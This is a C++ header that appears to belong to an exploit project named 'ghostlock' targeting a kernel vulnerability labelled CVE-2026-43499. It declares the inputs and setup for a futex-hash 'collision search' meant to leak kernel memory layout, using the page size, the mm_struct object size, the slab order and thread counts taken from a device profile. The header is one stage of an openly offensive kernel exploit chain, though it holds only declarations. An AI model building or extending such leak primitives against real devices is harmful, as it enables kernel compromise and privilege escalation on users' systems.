#pragma once
/** @file backend/cve_2026_43499/leak/snitch_setup.hpp
 *  What the collision search is given, and the shape it derives from it.
 *
 *  Two kinds of number meet here. The strides the walk takes are mechanism: a coarse
 *  stride that says how far apart the big steps are, and a slab stride that is a page
 *  shifted by an order. The rest come from outside -- the page size and the object size
 *  from the kernel, the collision and thread counts from the profile -- and everything
 *  derived from them is computed here rather than assumed anywhere.
 *
 *  The object size is the one that matters most, because it is the profile's own: the
 *  retired tree carried a default for it in code, and those defaults are what this tree
 *  removed. If it is missing the setup is refused, by name, with nothing half-filled: a
 *  search that does not know how large the thing it looks for is cannot step over it.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/leak/futex_hash.hpp"
#include "backend/cve_2026_43499/leak/scan_geometry.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    /** How far apart the coarse steps are: mechanism, from the retired tree. */
    inline constexpr std::uint64_t kCoarseStride = 1ULL << 30U;

    /** What a collision search is given from outside. */
    struct SnitchInputs final {
        /** The kernel's page size, measured on the device. */
        std::uint64_t page_size = 0U;
        /** The size of the object being looked for, from the profile. */
        std::uint64_t mm_struct_size = 0U;
        /** The page order the slab stride is built from. */
        std::uint64_t mm_slab_order = 0U;
        /** How many collisions to look for: fewer than two cannot be compared. */
        std::uint64_t collisions = 0U;
        /** How many threads search, and how many processors the kernel reports. */
        std::uint64_t thread_count = 0U;
        std::uint64_t possible_cpus = 0U;
    };

    /** The shape the search runs with. */
    struct SnitchSetup final {
        ScanStrides strides;
        std::uint64_t collisions = 0U;
        std::uint64_t thread_count = 0U;
        /** The futex table the collisions are looked for in. */
        std::uint32_t futex_table_size = 0U;
    };

    /** Why a search cannot be set up. Names follow the single table. */
    enum class SnitchSetupVerdict : unsigned char { Ok = 0, GeometryMissing = 1 };

    [[nodiscard]] constexpr const char *snitch_setup_verdict_name(
        SnitchSetupVerdict verdict) noexcept {
        return verdict == SnitchSetupVerdict::Ok ? "ok" : "geometry-missing";
    }

    /** Derive the shape. A missing or unusable input refuses the whole setup rather than
     *  producing a search that would step over nothing. */
    [[nodiscard]] SnitchSetupVerdict build_snitch_setup(const SnitchInputs &inputs,
                                                        SnitchSetup &out) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::leak
